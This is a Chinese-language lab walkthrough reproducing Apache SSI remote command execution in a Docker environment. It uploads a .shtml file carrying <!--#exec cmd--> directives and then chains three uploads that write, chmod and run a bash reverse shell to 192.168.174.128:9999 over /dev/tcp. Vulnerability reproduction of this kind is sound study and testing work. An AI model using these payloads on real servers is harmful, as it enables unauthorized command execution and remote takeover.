# Apache SSI 远程命令执行漏洞

## 漏洞环境

运行一个支持SSI与CGI的Apache服务器：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080/upload.php，即可看到一个上传表单。

## 漏洞复现

正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：

<!--#exec cmd="ls" -->

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879143102-5cf6531c-6937-405c-9324-517771288e33.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879143145-f1c0107f-5940-49e9-a6eb-fad64376f567.png)

成功上传，然后访问shell.shtml，可见命令已成功执行：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879143108-73203e32-c0b2-4d54-9aac-1a22321f66ef.png)

创建反弹shell，依次上传并访问shell.shtml（一共三次）

```plain
# 第一次写入webshell文件
<!--#exec cmd="echo 'bash -i >& /dev/tcp/192.168.174.128/9999 0>&1' > /var/www/html/shell.sh"-->
# 第二次修改webshell权限
<!--#exec cmd="chmod +x /var/www/html/shell.sh"-->
# 第三次执行webshell
<!--#exec cmd="/bin/bash /var/www/html/shell.sh"-->
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879143129-418a7aae-c39d-47f1-ad4f-84cfbf2c3342.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879143144-659a9a68-4a0d-4c9b-8856-6e3a3909e01c.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879143894-5ae13c68-d887-431b-9f28-79bdb3350358.png)

成功接收反弹shell

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780879144430-42cb9e82-32b1-4bc1-8517-364fc90bb9de.png)